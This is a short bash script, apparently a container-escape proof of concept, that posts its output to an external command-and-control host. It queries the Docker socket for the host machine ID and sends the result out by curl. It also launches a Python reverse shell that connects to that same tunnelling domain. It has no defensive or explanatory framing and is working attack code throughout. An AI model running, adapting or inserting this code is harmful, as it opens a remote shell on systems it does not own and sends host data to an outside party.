#!/bin/bash
C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] EMERGENCY DATA FLUSH ---"
  
  # 1. Force-kill any hung processes to clear the pipe
  pkill -9 curl || true

  # 2. Extract the HOST Machine ID (The P0 Proof)
  # We use --max-time to ensure curl doesn't hang forever
  ID=$(curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -oE '"ID":"[a-f0-9-]+"' || echo "ID_READ_FAILED")
  echo "HOST_ID: $ID"

  # 3. Create a 'Persistent' Reverse Shell
  # This doesn't wait for a response; it just pushes a shell to your Mac
  python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'4f6ce0d2037780f3-103-95-173-85.serveousercontent.com'",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &

} | curl -X POST -H "Content-Type: text/plain" --data-binary @- --max-time 10 "https://$C2_URL"
